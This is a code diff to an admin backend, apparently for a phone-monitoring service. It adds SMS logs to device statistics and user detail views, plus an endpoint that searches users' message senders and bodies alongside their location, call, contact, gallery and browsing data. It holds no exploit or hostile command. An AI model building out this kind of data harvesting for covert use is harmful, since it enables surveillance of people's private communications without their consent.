@@ -40,7 +40,7 @@ router.get('/stats', authenticate, requireAdmin, async (_req, res) => {
   const [
     totalUsers, totalDevices, onlineDevices,
     totalLocations, totalNotifications, totalUsageLogs,
-    totalCallLogs, totalContacts, totalGalleryItems,
+    totalCallLogs, totalSmsLogs, totalContacts, totalGalleryItems,
     newUsersToday, newDevicesToday, logsToday,
   ] = await Promise.all([
     prisma.user.count({ where: { role: { not: 'admin' } } }),
@@ -50,6 +50,7 @@ router.get('/stats', authenticate, requireAdmin, async (_req, res) => {
     prisma.notificationLog.count(),
     prisma.appUsageLog.count(),
     prisma.callLog.count(),
+    prisma.smsLog.count(),
     prisma.contact.count(),
     prisma.galleryItem.count(),
     prisma.user.count({ where: { createdAt: { gte: today }, role: { not: 'admin' } } }),
@@ -60,7 +61,7 @@ router.get('/stats', authenticate, requireAdmin, async (_req, res) => {
   res.json({
     totalUsers, totalDevices, onlineDevices,
     totalLocations, totalNotifications, totalUsageLogs,
-    totalCallLogs, totalContacts, totalGalleryItems,
+    totalCallLogs, totalSmsLogs, totalContacts, totalGalleryItems,
     newUsersToday, newDevicesToday, logsToday,
   });
 });
@@ -92,6 +93,7 @@ router.get('/devices', authenticate, requireAdmin, async (req, res) => {
               locationLogs: true,
               notificationLogs: true,
               callLogs: true,
+              smsLogs: true,
               galleryItems: true,
               browsingHistory: true,
               contacts: true,
@@ -132,7 +134,7 @@ router.get('/users', authenticate, requireAdmin, async (req, res) => {
             _count: {
               select: {
                 locationLogs: true, appUsageLogs: true, notificationLogs: true,
-                callLogs: true, contacts: true, galleryItems: true,
+                callLogs: true, smsLogs: true, contacts: true, galleryItems: true,
               },
             },
           },
@@ -162,7 +164,7 @@ router.get('/users/:userId', authenticate, requireAdmin, async (req, res) => {
           _count: {
             select: {
               locationLogs: true, appUsageLogs: true, notificationLogs: true,
-              statusLogs: true, callLogs: true, contacts: true, galleryItems: true,
+              statusLogs: true, callLogs: true, smsLogs: true, contacts: true, galleryItems: true,
               browsingHistory: true,
             },
           },
@@ -178,7 +180,7 @@ router.get('/users/:userId', authenticate, requireAdmin, async (req, res) => {
 
   const [
     recentLocations, recentNotifications, recentUsage,
-    recentCallLogs, contacts, galleryItems, browsingHistory, latestStatus,
+    recentCallLogs, recentSms, contacts, galleryItems, browsingHistory, latestStatus,
   ] = await Promise.all([
     prisma.locationLog.findMany({
       where: dWhere, orderBy: { capturedAt: 'desc' }, take: 20,
@@ -191,6 +193,9 @@ router.get('/users/:userId', authenticate, requireAdmin, async (req, res) => {
     }),
     prisma.callLog.findMany({
       where: dWhere, orderBy: { timestamp: 'desc' }, take: 50,
+    }),
+    prisma.smsLog.findMany({
+      where: dWhere, orderBy: { date: 'desc' }, take: 100,
     }),
     prisma.contact.findMany({
       where: dWhere, orderBy: { name: 'asc' }, take: 100,
@@ -220,6 +225,7 @@ router.get('/users/:userId', authenticate, requireAdmin, async (req, res) => {
     notifByApp,
     recentUsage: recentUsage.map((u) => ({ ...u, usageDurationMs: u.usageDurationMs.toString() })),
     recentCallLogs,
+    recentSms,
     contacts,
     galleryItems: galleryItems.map((g) => ({ ...g, sizeBytes: g.sizeBytes.toString() })),
     browsingHistory,
@@ -253,6 +259,32 @@ router.get('/users/:userId/calls', authenticate, requireAdmin, async (req, res) 
     orderBy: { timestamp: 'desc' }, take: 200,
   });
   res.json(logs);
+});
+
+// ── GET /api/admin/users/:userId/sms ─────────────────────────────────────────
+router.get('/users/:userId/sms', authenticate, requireAdmin, async (req, res) => {
+  const user = await prisma.user.findUnique({ where: { id: req.params.userId as string }, include: { devices: { select: { deviceId: true } } } });
+  if (!user) { res.status(404).json({ error: 'User not found' }); return; }
+
+  const allDeviceIds = user.devices.map((d) => d.deviceId);
+  const limit  = Math.min(Number(req.query.limit) || 200, 1000);
+  const search = req.query.search as string | undefined;
+  const dWhere = deviceWhere(allDeviceIds, req.query.deviceId as string | undefined);
+
+  const messages = await prisma.smsLog.findMany({
+    where: {
+      ...dWhere,
+      ...(search ? {
+        OR: [
+          { address: { contains: search, mode: 'insensitive' } },
+          { body:    { contains: search, mode: 'insensitive' } },
+        ],
+      } : {}),
+    },
+    orderBy: { date: 'desc' },
+    take:    limit,
+  });
+  res.json(messages);
 });
 
 // ── GET /api/admin/users/:userId/gallery ──────────────────────────────────────
